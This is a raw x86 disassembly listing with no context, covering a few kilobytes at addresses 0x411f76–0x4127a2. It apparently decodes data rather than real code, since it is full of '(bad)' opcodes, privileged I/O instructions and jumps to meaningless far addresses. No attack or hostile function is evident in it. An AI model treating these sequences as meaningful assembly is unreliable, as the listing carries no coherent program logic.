  411f76:	mov    ebx,0x6c6d12a7
  411f7b:	ss inc ebp
  411f7d:	or     ch,ch
  411f7f:	ins    DWORD PTR es:[edi],dx
  411f80:	mov    ah,0x42
  411f82:	clc    
  411f83:	mov    dh,0xe9
  411f85:	mov    es,WORD PTR [edx]
  411f87:	jo     0x411fb9
  411f89:	cs pop ss
  411f8b:	sbb    ecx,DWORD PTR [ebx+0x57]
  411f8e:	sbb    esp,eax
  411f90:	je     0x412005
  411f92:	cmp    al,0xdc
  411f94:	pushf  
  411f95:	inc    esp
  411f96:	sbb    bh,dh
  411f98:	aaa    
  411f99:	push   edx
  411f9a:	pop    ecx
  411f9b:	sbb    DWORD PTR [edx],ebx
  411f9d:	int    0x38
  411f9f:	cmc    
  411fa0:	cmc    
  411fa1:	mov    bl,cl
  411fa3:	aaa    
  411fa4:	std    
  411fa5:	pop    edi
  411fa6:	jb     0x411fed
  411fa8:	jg     0x411f50
  411faa:	xchg   edx,eax
  411fab:	popf   
  411fac:	and    ebx,DWORD PTR [esi]
  411fae:	cld    
  411faf:	and    DWORD PTR ds:0xd0366a21,0xaf4214dd
  411fb9:	sti    
  411fba:	adc    ebp,eax
  411fbc:	pusha  
  411fbd:	add    BYTE PTR [ebx+0x3f],bh
  411fc0:	pop    ebp
  411fc1:	stc    
  411fc2:	mov    esi,0x94337510
  411fc7:	sub    bl,al
  411fc9:	js     0x411f86
  411fcb:	jnp    0x411fc1
  411fcd:	rol    BYTE PTR [ecx],0xcb
  411fd0:	push   esi
  411fd1:	jne    0x411fcc
  411fd3:	imul   ecx,DWORD PTR [ebp-0x58],0x6d235455
  411fda:	stc    
  411fdb:	(bad)  
  411fdc:	sub    ecx,DWORD PTR [ebp-0x39]
  411fdf:	(bad)  
  411fe0:	sti    
  411fe1:	ja     0x411f83
  411fe3:	sbb    DWORD PTR [esi-0x5640b64d],ebp
  411fe9:	mov    al,0xff
  411feb:	into   
  411fec:	xchg   ecx,eax
  411fed:	jmp    0x412065
  411fef:	(bad)
  411ff4:	sbb    BYTE PTR [esi+ebx*2],0xac
  411ff8:	fimul  DWORD PTR ds:0x6b0ed00f
  411ffe:	pop    ecx
  411fff:	push   0x3ef9044
  412004:	ficomp WORD PTR [eax-0x5c]
  412007:	adc    BYTE PTR [edx+esi*2-0x58],0x9a
  41200c:	mov    ah,0xb2
  41200e:	mov    esi,0x725c9c40
  412013:	das    
  412014:	push   ecx
  412015:	mov    edi,ss
  412017:	fld    QWORD PTR [ebp-0x46008530]
  41201d:	daa    
  41201e:	mov    BYTE PTR [eax+eiz*1],dl
  412021:	mov    bh,0x88
  412023:	push   edx
  412024:	pusha  
  412025:	jg     0x412037
  412027:	cmp    esp,DWORD PTR [esi+0x3c]
  41202a:	xchg   ebp,eax
  41202b:	ins    DWORD PTR es:[edi],dx
  41202c:	jge    0x41208f
  41202e:	pop    eax
  41202f:	repz out dx,eax
  412031:	mov    cl,0x71
  412033:	mov    ds:0x880838dc,al
  412038:	iret   
  412039:	mov    ebx,0x44f8e02d
  41203e:	push   esp
  41203f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412040:	mov    BYTE PTR [eax-0x79],0x5c
  412044:	pop    edi
  412045:	and    ebx,DWORD PTR [edi+0x30]
  412048:	jl     0x41207f
  41204a:	or     BYTE PTR [esi+0x2a7f25c9],cl
  412050:	ds add eax,0x896a1d2
  412056:	cli    
  412057:	stc    
  412058:	in     eax,dx
  412059:	adc    esi,DWORD PTR [esp+esi*1-0x21]
  41205d:	push   esp
  41205e:	xchg   edx,eax
  41205f:	(bad)  
  412060:	jg     0x4120ad
  412062:	pop    es
  412063:	add    ch,BYTE PTR [edi+ecx*1-0x63df382e]
  41206a:	ret    
  41206b:	clc    
  41206c:	inc    edi
  41206d:	mov    ebx,0x4a2feb58
  412072:	int3   
  412073:	test   BYTE PTR [eax-0x72ff60b6],ch
  412079:	inc    DWORD PTR fs:[edi+0x27]
  41207d:	(bad)  
  41207e:	cmp    DWORD PTR [eax],edi
  412080:	push   ds
  412081:	jb     0x412062
  412083:	sub    eax,DWORD PTR [eax]
  412085:	out    dx,al
  412086:	aad    0xe4
  412088:	shl    BYTE PTR [eax-0x582fec0d],1
  41208e:	(bad)  
  41208f:	cli    
  412090:	push   esi
  412091:	pop    ss
  412092:	test   al,0x6d
  412094:	fst    DWORD PTR [edi+ebp*1]
  412097:	push   esp
  412098:	add    edi,eax
  41209a:	xor    BYTE PTR [edi-0x52],ch
  41209d:	push   ebp
  41209e:	add    ecx,DWORD PTR [edx+0x7e40113]
  4120a4:	test   al,0xd0
  4120a6:	push   eax
  4120a7:	or     al,0x6f
  4120a9:	and    BYTE PTR [ecx+0x3ce061f6],ah
  4120af:	pop    ecx
  4120b0:	or     DWORD PTR [edi],ebx
  4120b2:	in     eax,0xfd
  4120b4:	jne    0x4120f3
  4120b6:	and    ch,BYTE PTR [esi+edx*1+0x511d8b2b]
  4120bd:	inc    edi
  4120be:	out    0x4f,eax
  4120c0:	fcomp  QWORD PTR [edx+0x96e0331]
  4120c6:	repz adc ebx,ecx
  4120c9:	cwde   
  4120ca:	mov    eax,ds:0x54aa4150
  4120cf:	mov    ecx,0x17ba1733
  4120d4:	add    ch,BYTE PTR [ebp-0x68]
  4120d7:	mov    BYTE PTR [edx],ah
  4120d9:	inc    esp
  4120da:	fmul   DWORD PTR [ecx]
  4120dc:	mov    dl,0xc2
  4120de:	cli    
  4120df:	mov    al,0xb7
  4120e1:	sub    ebx,ebp
  4120e3:	sahf   
  4120e4:	mov    al,0x60
  4120e6:	push   edx
  4120e7:	dec    edx
  4120e8:	adc    bl,ch
  4120ea:	pop    es
  4120eb:	dec    eax
  4120ec:	or     bl,BYTE PTR [eax-0x57]
  4120ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120f0:	ins    BYTE PTR es:[edi],dx
  4120f1:	and    eax,0x144911fe
  4120f6:	lock neg BYTE PTR [ebx+0x6835074]
  4120fd:	shl    DWORD PTR [eax-0x31],1
  412100:	ret    
  412101:	mov    ebp,0xc98d3c21
  412106:	das    
  412107:	mov    ?,WORD PTR ss:[eax+0x70ce8d04]
  41210e:	or     ecx,edi
  412110:	out    dx,al
  412111:	loop   0x4120cb
  412113:	inc    edx
  412114:	data16 ror BYTE PTR [esi+edx*2],0x88
  412119:	rcr    DWORD PTR [ebx+edx*8],0xda
  41211d:	outs   dx,BYTE PTR ds:[esi]
  41211e:	out    0x59,eax
  412120:	jmp    0xb3f38b4d
  412125:	fmul   st,st(5)
  412127:	cmc    
  412128:	add    ecx,DWORD PTR [edi+ebp*8]
  41212b:	xor    esi,DWORD PTR [ebp+0xd]
  41212e:	add    al,0x9e
  412130:	stos   BYTE PTR es:[edi],al
  412131:	or     bl,BYTE PTR [edi+0x1b]
  412134:	pop    edx
  412135:	fucomp st(4)
  412137:	mov    bl,0xca
  412139:	sub    bl,bl
  41213b:	daa    
  41213c:	ret    
  41213d:	push   ebp
  41213e:	cmp    al,0x29
  412140:	mov    al,0xf1
  412142:	push   0x2183dd70
  412147:	mov    dh,0x7e
  412149:	cmp    bh,BYTE PTR [ebx-0x4a]
  41214c:	sbb    bl,dl
  41214e:	fisubr WORD PTR [ebp-0x16b6d75c]
  412154:	mov    eax,0x998ce094
  412159:	jbe    0x4121cb
  41215b:	test   DWORD PTR [edi],esp
  41215d:	xlat   BYTE PTR ss:[ebx]
  41215f:	sbb    al,0x0
  412161:	fcmovnu st,st(3)
  412163:	pop    edx
  412164:	sub    cl,BYTE PTR [eax+0x52328c29]
  41216a:	lock adc bh,BYTE PTR [edx]
  41216d:	clc    
  41216e:	fcmovnu st,st(2)
  412170:	dec    ebp
  412171:	mov    DWORD PTR ds:0xfdba203e,esp
  412177:	loopne 0x4121ce
  412179:	adc    DWORD PTR [edx+0x55],eax
  41217c:	in     eax,0x6c
  41217e:	sbb    edi,edx
  412180:	push   ecx
  412181:	push   edi
  412182:	add    dl,BYTE PTR [ebp+0x67a562a8]
  412188:	lahf   
  412189:	gs xor eax,0xd987cb42
  41218f:	cmp    BYTE PTR [esi+0x39],cl
  412192:	ds jae 0x4121f6
  412195:	mov    eax,ds:0x967e434f
  41219a:	xor    eax,0xc30fdbdc
  41219f:	test   DWORD PTR [eax-0x2a],edx
  4121a2:	pop    ebx
  4121a3:	addr16 jo 0x4121ef
  4121a6:	sub    ebp,esp
  4121a8:	mov    dh,al
  4121aa:	mov    al,0xd
  4121ac:	and    bl,dl
  4121ae:	add    ebx,DWORD PTR [eax+0x2381b63b]
  4121b4:	jb     0x41216b
  4121b6:	push   cs
  4121b7:	call   0xc6bf1c73
  4121bc:	mov    dl,0xcd
  4121be:	aam    0x8c
  4121c0:	mov    WORD PTR [ebp-0x649e265a],fs
  4121c6:	or     BYTE PTR [edx-0x38f034f7],ah
  4121cc:	retf   0xc47
  4121cf:	dec    edx
  4121d0:	into   
  4121d1:	push   edx
  4121d2:	or     DWORD PTR [edi-0x80],edi
  4121d5:	jge    0x41220f
  4121d7:	xor    eax,0x826d26f7
  4121dc:	cmp    ecx,edi
  4121de:	mov    eax,0x3f45ffae
  4121e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e4:	sbb    al,0x33
  4121e6:	(bad)  
  4121e7:	cmc    
  4121e8:	aas    
  4121e9:	inc    ebx
  4121ea:	push   ds
  4121eb:	stc    
  4121ec:	jne    0x4121d4
  4121ee:	aad    0x15
  4121f0:	gs xchg ecx,eax
  4121f2:	pop    esp
  4121f3:	sbb    esi,DWORD PTR [ebx-0x3e17cd3c]
  4121f9:	dec    edx
  4121fa:	cmpxchg edx,ecx
  4121fd:	and    al,0x6a
  4121ff:	mov    al,BYTE PTR [ebx+0x9d19aa0]
  412205:	fdivr  QWORD PTR [ebx-0x7e]
  412208:	mov    ch,bh
  41220a:	push   es
  41220b:	popa   
  41220c:	stc    
  41220d:	dec    BYTE PTR [edx-0x6fc9754c]
  412213:	jbe    0x4121c5
  412215:	mov    al,ds:0x69cacec
  41221a:	aam    0x9b
  41221c:	pusha  
  41221d:	pop    ecx
  41221e:	jl     0x41229d
  412220:	int    0x79
  412222:	fisubr WORD PTR [edx+0xcae331c]
  412228:	cmp    ebx,DWORD PTR [ebp+0x28]
  41222b:	dec    cx
  41222d:	add    BYTE PTR [ebx+0x1ab9ae22],0xca
  412234:	inc    eax
  412235:	fucomp st(1)
  412237:	jp     0x412200
  412239:	shl    BYTE PTR [ecx-0x34e225fb],0xad
  412240:	ja     0x41229d
  412242:	rol    BYTE PTR [edx-0x6e],1
  412245:	(bad)  
  412247:	xchg   ecx,eax
  412248:	and    al,BYTE PTR [ebx-0x7c]
  41224b:	add    ebx,DWORD PTR [ebx-0xb8e8400]
  412251:	xchg   eax,ebx
  412253:	mov    al,0xcc
  412255:	popf   
  412256:	push   ebp
  412257:	mov    ah,0xda
  412259:	xor    BYTE PTR [edi],0x38
  41225c:	stos   BYTE PTR es:[edi],al
  41225d:	das    
  41225e:	add    ah,BYTE PTR [esp+ebp*4-0x60]
  412262:	jbe    0x4122c9
  412264:	ret    
  412265:	xchg   DWORD PTR [edx+0x7a],esp
  412268:	sub    DWORD PTR [ebx+eiz*8],edi
  41226b:	fcomp  QWORD PTR [edx+0x37a04e38]
  412271:	sub    ecx,0x20
  412274:	pop    ds
  412275:	sub    eax,0x7c27b2a4
  41227a:	jbe    0x4122de
  41227c:	adc    BYTE PTR [ebp-0x6b9f167d],dh
  412282:	jle    0x412205
  412284:	aad    0x19
  412286:	push   ss
  412287:	dec    esp
  412288:	mov    bh,0x9f
  41228a:	test   eax,0xaf49489f
  41228f:	mov    dl,0x5a
  412291:	pushf  
  412292:	fisubr DWORD PTR [ecx]
  412294:	call   0x59b76b17
  412299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41229a:	push   es
  41229b:	xlat   BYTE PTR ds:[ebx]
  41229c:	repz jge 0x41225b
  41229f:	adc    BYTE PTR [ecx+0x79],cl
  4122a2:	loope  0x41230a
  4122a4:	stc    
  4122a5:	dec    edi
  4122a6:	mov    DWORD PTR [ecx],0xedad44a9
  4122ac:	imul   ebx,esp,0x490da6c6
  4122b2:	and    al,0x7e
  4122b4:	not    esi
  4122b6:	imul   edx,DWORD PTR [ebp+0x195daad5],0xabcfffbc
  4122c0:	mov    ecx,cs
  4122c2:	mov    ecx,0x6623955c
  4122c7:	pop    ecx
  4122c8:	xor    DWORD PTR [ecx-0x15feff98],ebx
  4122ce:	fld    st(2)
  4122d0:	mov    ds:0x4195c084,eax
  4122d5:	ss xchg ax,ax
  4122d8:	in     al,dx
  4122d9:	rdmsr  
  4122db:	mov    ebp,0x8630a30d
  4122e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122e1:	in     eax,dx
  4122e2:	mov    edx,0xbad2c85f
  4122e7:	rcr    BYTE PTR [esp+ebp*4-0x3987a82c],1
  4122ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122ef:	mov    WORD PTR [eax],ds
  4122f1:	pusha  
  4122f2:	mov    edx,ebx
  4122f4:	mov    edx,0xc763ff1
  4122f9:	mov    ch,0x74
  4122fb:	and    eax,0xfb657a16
  412300:	cli    
  412301:	push   eax
  412302:	shr    BYTE PTR [ebx+0x5fc0b6e],cl
  412308:	mov    edx,edx
  41230a:	mov    ds:0x6ea5a288,eax
  41230f:	(bad)  
  412310:	mov    ch,0x63
  412312:	jl     0x41238d
  412314:	push   ebx
  412315:	add    al,0x89
  412317:	push   edx
  412318:	inc    esp
  412319:	fdivp  st(2),st
  41231b:	mov    edi,0x103bacfb
  412320:	push   edx
  412321:	mov    WORD PTR [esi+esi*2+0x33],gs
  412325:	sub    al,0x55
  412327:	out    0x8a,al
  412329:	fisttp WORD PTR [esi+0x73]
  41232c:	mov    eax,0x3170ab54
  412331:	xor    BYTE PTR [ebx],ch
  412333:	sub    al,0x4e
  412335:	nop
  412336:	nop
  412337:	inc    ebx
  412338:	imul   esp,DWORD PTR [ecx+0x43],0x4d
  41233c:	mov    ch,0xa9
  41233e:	add    ecx,eax
  412340:	fadd   st,st(5)
  412342:	adc    ah,BYTE PTR [ecx-0x43bf79db]
  412348:	call   0x86b6a793
  41234d:	sbb    eax,0xf54bc2f3
  412352:	pop    ss
  412353:	sar    BYTE PTR [ebx-0x2f99adc6],cl
  412359:	popa   
  41235a:	jnp    0x41236a
  41235c:	cdq    
  41235d:	mov    dl,0x93
  41235f:	or     DWORD PTR [edx-0x71f0d74a],ecx
  412365:	sbb    bl,BYTE PTR [ebx-0x61b05ca4]
  41236b:	ds loop 0x412388
  41236e:	pop    ebx
  41236f:	sbb    esi,ebx
  412371:	in     al,0xf6
  412373:	push   0x2a
  412375:	lds    eax,FWORD PTR [eax+0x79]
  412378:	mov    ds,WORD PTR [ecx+0x384c8f16]
  41237e:	inc    edx
  41237f:	mov    BYTE PTR [edx],0x6c
  412382:	mov    dl,0xcc
  412384:	adc    DWORD PTR [edi-0x38],0x8f9ad3c5
  41238b:	pop    ecx
  41238c:	xchg   ecx,eax
  41238d:	cmp    esp,DWORD PTR [edi]
  41238f:	pop    ebp
  412390:	aas    
  412391:	hlt    
  412392:	cli    
  412393:	out    0x4d,eax
  412395:	and    ecx,DWORD PTR [edx+0x59]
  412398:	xor    BYTE PTR [eax-0x1d],dl
  41239b:	pop    ebp
  41239c:	dec    edi
  41239d:	jp     0x4123ce
  41239f:	and    al,BYTE PTR [ecx-0x15a7aee7]
  4123a5:	xchg   BYTE PTR [esi-0x40],dl
  4123a8:	mov    dl,0x9c
  4123aa:	add    bh,BYTE PTR [ebp-0x8]
  4123ad:	sub    eax,0x1eac7bc1
  4123b2:	fmul   DWORD PTR ds:0x81ef2cc2
  4123b8:	and    al,0xb9
  4123ba:	mov    al,0x19
  4123bc:	sub    BYTE PTR [ecx+0x56],bl
  4123bf:	nop
  4123c0:	loop   0x4123f1
  4123c2:	mov    WORD PTR [bp+si+0x5dc3],?
  4123c7:	stos   BYTE PTR es:[edi],al
  4123c8:	sar    ebx,1
  4123ca:	cmp    edx,DWORD PTR [esi+0x7a9d7eee]
  4123d0:	dec    ecx
  4123d1:	int3   
  4123d2:	test   eax,0x9daba365
  4123d7:	sar    dh,0x76
  4123da:	mov    BYTE PTR [ecx-0x4a],0xb9
  4123de:	xor    dl,BYTE PTR [edx]
  4123e0:	inc    edx
  4123e1:	jne    0x4123e0
  4123e3:	cmp    edi,DWORD PTR ds:0xd5738691
  4123e9:	pusha  
  4123ea:	gs push cs
  4123ec:	jnp    0x412391
  4123ee:	test   BYTE PTR [ecx-0x6d],ah
  4123f1:	mov    dh,0x38
  4123f3:	stos   BYTE PTR es:[edi],al
  4123f4:	std    
  4123f5:	test   al,0xc0
  4123f7:	xchg   edi,eax
  4123f8:	mov    DWORD PTR [edx+0x64a95485],0x88837305
  412402:	adc    ebp,DWORD PTR [edx+0x15]
  412405:	or     ecx,ebx
  412407:	jo     0xde5ba828
  41240d:	stos   BYTE PTR es:[edi],al
  41240e:	mov    ch,0xe2
  412410:	cmc    
  412411:	jp     0x412414
  412413:	or     DWORD PTR [esi],ecx
  412415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412416:	out    0xcd,al
  412418:	int    0x9a
  41241a:	sub    al,0x1f
  41241c:	idiv   BYTE PTR [ebp-0x317a62a2]
  412422:	and    al,0xdb
  412424:	adc    ch,BYTE PTR [ecx-0x5126ab8c]
  41242a:	pop    ebp
  41242b:	fisttp QWORD PTR es:[ebx]
  41242e:	cmp    BYTE PTR [ecx-0x46042a65],bl
  412434:	js     0x4123c9
  412436:	aad    0x83
  412438:	imul   ebp,edi,0xffffff88
  41243b:	arpl   WORD PTR [eax-0x2a],bp
  41243e:	sbb    eax,0x6d93840e
  412443:	sbb    eax,0x4d6edd06
  412448:	daa    
  412449:	mov    ch,0x32
  41244b:	mov    cl,0x47
  41244d:	sbb    BYTE PTR [eax],cl
  41244f:	fcomi  st,st(7)
  412451:	add    BYTE PTR [eax-0x64],cl
  412454:	test   al,0x2
  412456:	xchg   DWORD PTR cs:[edi-0x50eb3181],ebx
  41245d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41245e:	cs push esp
  412460:	xor    eax,0xc8fbe9cd
  412465:	fbld   TBYTE PTR [eax]
  412467:	cli    
  412468:	(bad)  
  412469:	push   edi
  41246a:	inc    eax
  41246b:	(bad)  
  41246c:	push   ebx
  41246d:	jmp    0x41241e
  41246f:	test   al,0xa2
  412471:	pusha  
  412472:	inc    edx
  412473:	ret    
  412474:	jnp    0x41245b
  412476:	std    
  412477:	xchg   ecx,eax
  412478:	jo     0x4124b7
  41247a:	je     0x4124c0
  41247c:	inc    ebp
  41247d:	dec    eax
  41247e:	push   0x18aab267
  412483:	loope  0x412457
  412485:	push   ds
  412486:	lods   eax,DWORD PTR ds:[esi]
  412487:	lods   eax,DWORD PTR ds:[esi]
  412488:	xor    bh,BYTE PTR [esi+0x6dedf623]
  41248e:	pop    es
  41248f:	div    DWORD PTR [esi+ebp*8+0x426fb40c]
  412496:	sahf   
  412497:	(bad)  
  412498:	adc    eax,0x4b6b304a
  41249d:	xchg   ebp,eax
  41249e:	jo     0x4124d6
  4124a0:	gs mov al,0xa2
  4124a3:	pop    esp
  4124a4:	dec    eax
  4124a5:	mov    bl,0x39
  4124a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124a8:	sti    
  4124a9:	pop    ss
  4124aa:	sub    al,0x29
  4124ac:	test   al,0xb9
  4124ae:	cmp    edx,DWORD PTR [eax+0x4d190d46]
  4124b4:	and    DWORD PTR [esi-0x7029ee58],esi
  4124ba:	ror    dl,cl
  4124bc:	push   dx
  4124be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124bf:	popa   
  4124c0:	lea    ebx,[ebx-0x5a3654b7]
  4124c6:	pop    edx
  4124c7:	mov    WORD PTR [esi],fs
  4124c9:	scas   al,BYTE PTR es:[edi]
  4124ca:	or     ch,bh
  4124cc:	retf   
  4124cd:	sub    BYTE PTR [edi+0x10],0x90
  4124d1:	xor    dh,ah
  4124d3:	in     eax,dx
  4124d4:	or     eax,0x4385dc48
  4124d9:	and    dl,ah
  4124db:	adc    DWORD PTR [ecx+0x5753df61],edx
  4124e1:	xor    ecx,esi
  4124e3:	aam    0xf2
  4124e5:	inc    ebx
  4124e6:	inc    ecx
  4124e7:	inc    edx
  4124e8:	aam    0x3a
  4124ea:	ss cmc 
  4124ec:	jne    0x412534
  4124ee:	out    0x27,eax
  4124f0:	and    ebp,DWORD PTR ds:[esi+0x607e3d68]
  4124f7:	call   0xa176:0xd166f683
  4124fe:	or     ebx,DWORD PTR [edi-0x36]
  412501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412502:	gs jecxz 0x412580
  412505:	stos   DWORD PTR es:[edi],eax
  412506:	push   0x54
  412508:	sub    DWORD PTR [edi+0x1b369db2],ebx
  41250e:	inc    ebx
  41250f:	int    0x91
  412511:	pop    ecx
  412512:	clc    
  412513:	inc    edx
  412514:	mov    al,ds:0xd56e3c20
  412519:	mov    DWORD PTR [edi+0x5d17abeb],0x6c4d75a0
  412523:	(bad)  
  412525:	sbb    dh,BYTE PTR [eax+0x2092bb45]
  41252b:	mov    esi,DWORD PTR [edx+0x5b]
  41252e:	push   ecx
  41252f:	cmp    al,0xbb
  412531:	add    ch,cl
  412533:	sub    DWORD PTR [ebx],edi
  412535:	idiv   DWORD PTR [esi+0x45753768]
  41253b:	btc    ebp,edx
  41253e:	mov    al,0x38
  412540:	(bad)  
  412542:	mov    al,ds:0xbba0f70
  412547:	jecxz  0x412559
  412549:	hlt    
  41254a:	dec    edx
  41254b:	mov    al,0xb1
  41254d:	jns    0x412521
  41254f:	enter  0x4f5a,0xea
  412553:	sahf   
  412554:	xor    bh,BYTE PTR [esi]
  412556:	mov    dl,BYTE PTR [ecx+0x9]
  412559:	les    ebx,FWORD PTR [edi-0x7d]
  41255c:	mov    esp,0xea90a3a8
  412561:	inc    esp
  412562:	sbb    eax,0x7436569a
  412567:	and    al,0x96
  412569:	or     BYTE PTR [esi],0xcb
  41256c:	mov    edx,0x736d4352
  412571:	div    BYTE PTR [ecx-0x10cf3abf]
  412577:	xor    al,0x33
  412579:	or     DWORD PTR [edx],0x10f334b1
  41257f:	sub    al,0xcd
  412581:	(bad)
  412584:	test   BYTE PTR [esi-0x9],dh
  412587:	fadd   st(1),st
  412589:	jmp    0xbfd6:0x24c9116e
  412590:	setl   BYTE PTR [ebx]
  412593:	lods   eax,DWORD PTR ds:[esi]
  412594:	out    dx,al
  412595:	or     bh,BYTE PTR [esi]
  412597:	jno    0x412612
  412599:	popa   
  41259a:	sub    BYTE PTR [eax+eiz*1],0x3e
  41259e:	out    dx,eax
  41259f:	retf   
  4125a0:	push   edi
  4125a1:	out    dx,al
  4125a2:	jmp    0xb53c:0x3de28fad
  4125a9:	jge    0x4125dc
  4125ab:	add    bh,0xc1
  4125ae:	int3   
  4125af:	jnp    0x41261b
  4125b1:	sbb    BYTE PTR [ebp-0x14a9f10c],ah
  4125b7:	cmp    DWORD PTR [edi-0x51],edx
  4125ba:	enter  0xac65,0x71
  4125be:	(bad)  
  4125bf:	xchg   esp,eax
  4125c0:	mov    ebp,0x587abe13
  4125c5:	fcmovbe st,st(5)
  4125c7:	mov    cl,0xf
  4125c9:	rcr    BYTE PTR [ebp+0x6d4a63e0],cl
  4125cf:	xchg   esp,eax
  4125d0:	les    ebp,FWORD PTR [edx-0x21]
  4125d3:	lock pop ecx
  4125d5:	lea    ebp,[edi+eax*4]
  4125d8:	pop    eax
  4125d9:	add    DWORD PTR [ebp-0x4190d8a3],edi
  4125df:	mov    ah,0xe7
  4125e1:	adc    eax,0x899608a7
  4125e6:	scas   eax,DWORD PTR es:[edi]
  4125e7:	sub    al,0xc9
  4125e9:	retf   0xead9
  4125ec:	jnp    0x4125c5
  4125ee:	sub    BYTE PTR gs:[ebx+0x77fd2723],cl
  4125f5:	xchg   esi,eax
  4125f6:	(bad)  
  4125f8:	inc    edx
  4125f9:	or     esp,DWORD PTR [ebx-0x27e0127a]
  4125ff:	aad    0x95
  412601:	jns    0x41258f
  412603:	mov    ebp,0xffba7ca1
  412608:	inc    esi
  412609:	mov    edx,DWORD PTR [edx+0x56]
  41260c:	dec    ebp
  41260d:	and    ch,BYTE PTR [edi+0x72]
  412610:	jmp    0x796a3f84
  412615:	and    al,0x73
  412617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412618:	dec    ebx
  412619:	or     al,0x8e
  41261b:	pushf  
  41261c:	push   ecx
  41261d:	sub    BYTE PTR [edi],bh
  41261f:	inc    eax
  412620:	add    DWORD PTR [edx-0x76e60e4e],edi
  412626:	lea    edx,[ebx-0x10]
  412629:	cmp    BYTE PTR [edx-0x5edc2984],bh
  41262f:	dec    edi
  412630:	mov    bl,0x2
  412632:	pop    esi
  412633:	inc    esi
  412634:	not    DWORD PTR [edi-0x12fe6a7b]
  41263a:	int    0x7a
  41263c:	and    DWORD PTR [ebx],ebp
  41263e:	xchg   BYTE PTR [edi+0x594fad7b],ch
  412644:	idiv   BYTE PTR [esi+0x1178ff5c]
  41264a:	ins    BYTE PTR es:[edi],dx
  41264b:	(bad)
  41264e:	sub    dh,ah
  412650:	push   0x3a3fc711
  412655:	mov    esi,DWORD PTR [edi-0x75553fd3]
  41265b:	ds cmc 
  41265d:	daa    
  41265e:	call   0x2dce:0xae514784
  412665:	cld    
  412666:	lods   al,BYTE PTR ds:[esi]
  412667:	rcl    ah,1
  412669:	mov    dh,0x2e
  41266b:	or     ecx,0xcfd22057
  412671:	push   ecx
  412672:	xchg   esp,eax
  412673:	push   esp
  412674:	jg     0x41268c
  412676:	sbb    eax,0xd71233e2
  41267b:	mov    esp,DWORD PTR [ebp+0x44]
  41267e:	add    cl,bh
  412680:	or     eax,0x17d83acf
  412685:	test   eax,0xaf825232
  41268a:	and    BYTE PTR [ebx+0x458641ab],ah
  412690:	gs scas eax,DWORD PTR es:[edi]
  412692:	dec    ebp
  412693:	dec    esi
  412694:	cdq    
  412695:	mov    ?,WORD PTR ds:0xdc10a5f
  41269b:	and    al,0x4c
  41269d:	inc    ecx
  41269e:	xor    eax,DWORD PTR [edx-0x48]
  4126a1:	or     ecx,DWORD PTR [ebx+0x37]
  4126a4:	in     al,dx
  4126a5:	cmp    edx,0x9f562d13
  4126ab:	jmp    ebp
  4126ad:	call   0xe0800d2c
  4126b2:	xchg   esi,eax
  4126b3:	jle    0x4126eb
  4126b5:	pushf  
  4126b6:	xchg   dx,ax
  4126b8:	ret    
  4126b9:	fadd   st(7),st
  4126bb:	scas   eax,DWORD PTR es:[edi]
  4126bc:	add    BYTE PTR [edx+0x2a7af29f],bh
  4126c2:	call   0xdb35:0x8c549d39
  4126c9:	xchg   ebx,eax
  4126ca:	shl    DWORD PTR [esi+0xf],cl
  4126cd:	cwde   
  4126ce:	mov    ecx,0xdc1d087b
  4126d3:	and    al,BYTE PTR [esi-0x59ed446d]
  4126d9:	xor    eax,0x7b0fcd13
  4126de:	pop    edx
  4126df:	mov    ds:0x124baabf,eax
  4126e4:	test   al,0x93
  4126e6:	push   ds
  4126e7:	test   eax,0xecb8a8f7
  4126ec:	add    bl,BYTE PTR [edx+ecx*2+0xa3be8fe]
  4126f3:	push   edx
  4126f4:	push   0xba23f3c
  4126f9:	and    BYTE PTR [ebx+0x2f],0x66
  4126fd:	sbb    eax,0x77c35521
  412702:	mov    WORD PTR [edx+0x115362de],cs
  412708:	sbb    ch,BYTE PTR [eax+0x6ee2e473]
  41270e:	imul   ecx,DWORD PTR ds:0x2fe44413,0x161e9121
  412718:	inc    ebx
  412719:	(bad)  
  41271a:	add    eax,0xe9842b11
  41271f:	or     eax,0x285d4bbd
  412724:	dec    esi
  412725:	jle    0x41277c
  412727:	hlt    
  412728:	hlt    
  412729:	loopne 0x41271e
  41272b:	and    eax,0x62aaceca
  412730:	sbb    cx,si
  412733:	ins    BYTE PTR es:[edi],dx
  412734:	push   ebp
  412735:	loop   0x412754
  412737:	push   0xbc250ddd
  41273c:	jbe    0x412722
  41273e:	mov    bh,0xd5
  412740:	dec    esi
  412741:	push   eax
  412742:	shr    BYTE PTR [eax+ebp*2+0x18],cl
  412746:	xchg   esp,eax
  412747:	mov    dh,0x4c
  412749:	sub    al,0x5b
  41274b:	sbb    DWORD PTR [ebp+0x3e],edx
  41274e:	cmp    dl,BYTE PTR [edx+0x3a]
  412751:	popf   
  412752:	stc    
  412753:	cdq    
  412754:	xlat   BYTE PTR ds:[ebx]
  412755:	mov    al,ds:0x707886e9
  41275a:	sbb    DWORD PTR [edi],eax
  41275c:	sbb    eax,DWORD PTR [edi+0x3a]
  41275f:	pop    ebx
  412760:	in     al,dx
  412761:	jmp    0x7c34:0xc5fa75ba
  412768:	test   BYTE PTR [ecx],cl
  41276a:	les    esp,FWORD PTR [esi+eiz*1]
  41276d:	or     DWORD PTR [ebp-0x3c],eax
  412770:	mov    ch,0xb5
  412772:	mov    dl,0x65
  412774:	data16 int 0x8a
  412777:	xor    edi,DWORD PTR [eax-0x1fb4f361]
  41277d:	lea    ecx,[esi-0x19]
  412780:	add    esp,DWORD PTR [edi+ecx*1-0x22610d39]
  412787:	call   0x70648352
  41278c:	xor    BYTE PTR [ebx],bl
  41278e:	pop    ebx
  41278f:	and    edi,edi
  412791:	sub    al,0x89
  412793:	test   BYTE PTR [edi+0x47877411],bl
  412799:	push   ds
  41279a:	or     ebx,0xe63e7970
  4127a0:	adc    al,0x5e
  4127a2:	stos   DWORD PTR es:[edi],eax
